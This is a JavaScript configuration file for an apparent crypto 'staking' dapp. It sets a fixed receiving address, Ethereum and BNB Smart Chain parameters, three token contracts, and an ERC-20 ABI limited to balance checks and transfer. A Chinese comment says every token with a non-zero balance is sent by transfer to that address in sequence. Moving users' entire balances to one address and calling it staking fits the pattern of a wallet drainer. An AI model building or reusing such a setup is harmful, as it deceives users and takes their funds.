export const STAKING_ADDRESS =
  "0x955331c0FAD08080B87B37cdE32BF70aa70CD441";

/** 以太坊主网 */
export const CHAINS = {
  ETH: {
    id: 1n,
    hex: "0x1",
    addParams: {
      chainId: "0x1",
      chainName: "Ethereum Mainnet",
      nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
      rpcUrls: ["https://eth.llamarpc.com"],
      blockExplorerUrls: ["https://etherscan.io"],
    },
  },
  /** BSC 主网 */
  BSC: {
    id: 56n,
    hex: "0x38",
    addParams: {
      chainId: "0x38",
      chainName: "BNB Smart Chain",
      nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
      rpcUrls: ["https://bsc-dataseed.binance.org"],
      blockExplorerUrls: ["https://bscscan.com"],
    },
  },
};

/**
 * 按顺序检测余额；凡余额大于 0 的均会在对应链上依次质押转账（可连续多笔）。
 * 0x69fd… 为以太坊主网，其余两个为 BSC。
 */
export const STAKE_ASSETS = [
  {
    token: "0x69fd9281a920717ee54193a1c130b689ef341933",
    chainKey: "ETH",
  },
  {
    token: "0x44449ba264dffdcf903128c6800d9e4d3998adaf",
    chainKey: "BSC",
  },
  {
    token: "0x77a0b34da3f61a60dd411460f253b3cf17bd7777",
    chainKey: "BSC",
  },
];

export const ERC20_ABI = [
  "function balanceOf(address owner) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function transfer(address to, uint256 amount) returns (bool)",
];
